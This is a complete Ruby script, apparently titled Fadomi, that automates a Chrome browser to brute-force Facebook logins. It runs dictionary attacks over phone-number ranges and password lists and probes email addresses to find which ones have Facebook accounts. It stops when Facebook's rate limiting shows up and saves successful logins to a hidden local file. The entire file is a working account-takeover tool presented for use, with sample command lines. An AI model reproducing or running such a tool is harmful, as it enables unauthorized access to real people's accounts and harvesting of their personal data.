#!/bin/ruby
require 'watir-webdriver'
require 'terminal-table'
require 'colorize'

trap("SIGINT") { throw :ctrl_c }
catch :ctrl_c do
begin
  system("clear")
  puts '	 (             (         )     *     (     '.red
  puts '	 )\ )    (     )\ )   ( /(   (  `    )\ )  '.red
  puts '	(()/(    )\   (()/(   )\())  )\))(  (()/(  '.red
  puts '	 /(_))((((_)(  /(_)) ((_)\  ((_)()\  /(_)) '.red
  puts '	(_))_|'.blue + ' )\ _ )\(_))_    ((_) (_()((_)(_))    '.yellow
  puts '	| |_  '.blue + '  (_)_\(_)|   \  / _ \ |  \/  ||_ _|  '.yellow
  puts '	| __| '.blue + '   / _ \  | |) || (_) || |\/| | | |   '.yellow
  puts '	|_|   '.blue + '  /_/ \_\ |___/  \___/ |_|  |_||___|  '.yellow
  puts '        		  CODED BY MAGDY MOUSTAGA		 '.white
  puts ''
  def help
    puts "|[   -db => show database successful logins , use with clear '-dbs clear' to delete database ".green
    puts "|[   -m1  , --mode1  => bruteforce in range".green
    puts "|[   -m1+ , --mode1+ => dictionary attack on user name and password from the same list".green
    puts "|[   -m2  , --mode2  => dictionary attack on username with password list".green
    puts "|[   -m2+ , --mode2+ => bruteforce emails from range to get linked emails with facebook".green
    puts "|[   -ttf , --targets-to-find => set the numbers of targets to find ( Optional ) ".green
    puts "|[   usage. ruby Fadomi.rb [ option ] [ parameter 1 ] [ parameter 2 ] ... ".green
    puts "|[   eg. ruby Fadomi.rb -db".green
    puts "|[   eg. ruby Fadomi.rb -m1 phone_number_end_with_400 phone_number_end_with_500 -ttf 3 ".green
    puts "|[   eg. ruby Fadomi.rb -m1+ phone_numbers_list.txt ".green
    puts "|[   eg. ruby Fadomi.rb --mode2 ashgan11 password_list.txt".green 
    puts "|[   eg. ruby Fadomi.rb --mode2+ eva_steamINJECT_HERE@yahoo.com 1 50 password".green
    exit
  end
  if ARGV[0] == "-db"
    if File.file?(".database.txt") == true && ARGV[1] == nil 
      fileObj = File.new( '.database.txt' , "r")
      while (line = fileObj.gets)
        puts(line)
      end
      fileObj.close
    elsif File.file?(".database.txt") == true && ARGV[1] == 'clear' 
      puts "[+] Successful logins database has been deleted"
      File.delete('.database.txt')
    else
      puts "[X] You Have Nothing To Show .. Yet :))" 
    end
    exit
  elsif ARGV[0] == nil || ARGV[0] == "-h" || ARGV[0] == "--help"
    help
  end
  if ARGV[0] =~ /-/
    @browser = Watir::Browser.new :chrome
    @browser.goto 'https://m.facebook.com'
  else
    help
  end
  rows= []
  table = Terminal::Table.new :headings => [ "Target" , "Password " , "Task Information" ], :rows => rows , :style => {:width => 60 }
  table.style = { :padding_left => 3, :border_x => "=", :border_i => "x"}
  puts "#{table}".yellow

  @v=0
  @ttf = ARGV[4].to_i
  def browserr ( b1 , b2 )
    def browser_action
      @browser.close
      @browser = Watir::Browser.new :chrome
      @browser.goto "https://m.facebook.com"
    end
    @browser.text_field( :name => 'email' ).set b1 
    @browser.text_field( :name => 'pass' ).set b2
    sleep 1
    @browser.button( :name => 'login' ).click
    sleep 2
    if @browser.text.include?("try again later") == true			
      @rows2 = []
      @rows2 << [ "[X] Failed To Login , Facebook Breuteforce Detection ERR " ]
      @table2 = Terminal::Table.new :rows => @rows2
      @table2.style = { :border_x => "=", :border_i => "x"}
      puts ''
      @browser.close
      puts "#{@table2}".red
      exit
    elsif @browser.text_field( :name => 'email' ).exists? == false || @browser.text_field( :name => 'pass' ).exists? == false || @browser.button( :name => 'login' ).exists? == false			
      @rows2 = []
      @rows2 << [ b1 , b2  , "[+] Succeed To Login" ] 
      @table2 = Terminal::Table.new :rows => @rows2 , :style => {:width => 60 }
      @table2.style = { :padding_left => 3, :border_x => "=", :border_i => "x"}
      puts "#{@table2}".blue
      open('.database.txt', 'a') { |f|
        f.puts "#{@table2}"
      }
      if ARGV[3] == "-ttf" || ARGV[3] == "--ttf" || ARGV[3] == "--targets-to-find"
        @v=@v+1
        if @v.to_i > @ttf || @v.to_i == @ttf
          @browser.close
          exit
        end
      end
      browser_action
      else
        if ARGV[0] == "-m2+" || ARGV[0] == "--mode2+"
           if @browser.text.include?("doesn't match any account") == true 
             @rows2 = []
             @rows2 << [ b1 , "[X] Does Not Exists" ]
             @table2 = Terminal::Table.new :rows => @rows2 , :style => {:width => 60 }
             @table2.style = { :padding_left => 3, :border_x => "=", :border_i => "x"}
             puts "#{@table2}".red
           else 
           @rows2 = []
           @rows2 << [ b1 , "[+] Email Found " ]
           @table2 = Terminal::Table.new :rows => @rows2 , :style => {:width => 60 }
           @table2.style = { :padding_left => 3, :border_x => "=", :border_i => "x"}
           puts "#{@table2}".green
           open('emails.txt', 'a') { |f|
             f.puts "#{b1}"
           }
        end
      else                 
        @rows2 = []
        @rows2 << [ b1 , b2 , "[X] Failed To Login" ]
        @table2 = Terminal::Table.new :rows => @rows2 , :style => {:width => 60 }
        @table2.style = { :padding_left => 3, :border_x => "=", :border_i => "x"}
        puts "#{@table2}".red
      end
    end
  end

  if ARGV[0] == "-m1" || ARGV[0] == "--mode1"
    for i in ARGV[1] .. ARGV[2]
      browserr i , i 
    end
  elsif ARGV[0] == "-m2" || ARGV[0] == "--mode2"
    f = File.new( ARGV[2] , "r")
    while (line = f.gets)
      browserr ARGV[1] , line
    end
    f.close

  elsif ARGV[0] == "-m1+" || ARGV[0] == "--mode1+"
    f = File.new( ARGV[1] , "r")
    while (line = f.gets)
      browserr line , line
    end
    f.close
         
  elsif ARGV[0] == "-m2+" || ARGV[0] == "--mode2+"
    for i in ARGV[2]..ARGV[3]
      tt = ARGV[1].dup
      user = tt.sub! 'INJECT_HERE' , i.to_s
      browserr user , ARGV[4]
    end
  end

  @browser.close
  rescue Exception
  end
end
puts ""
puts "[X] EXIT"
